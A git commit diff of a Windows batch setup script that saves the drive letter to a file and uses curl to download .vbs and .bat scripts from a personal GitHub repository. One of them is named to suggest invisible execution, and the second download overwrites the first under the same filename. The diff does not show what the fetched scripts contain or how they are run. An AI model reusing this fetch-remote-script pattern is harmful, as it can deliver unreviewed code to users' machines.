20188d5e59e848d7ea6b54bd0f1ebb6a1391f869
SnowyOwl <49002319+Th3SnowyOwl@users.noreply.github.com>
2022-08-03 01:30:36 -0400

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -8,5 +8,5 @@ echo %drive% > driveletter.txt
 set /p var=<driveletter.txt
 %drive%
 curl -o invis.vbs https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/invis.vbs
-curl -o invis.vbs https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/nay.vbs
+curl -o invis.vbs https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/nay.bat
 echo. > setup
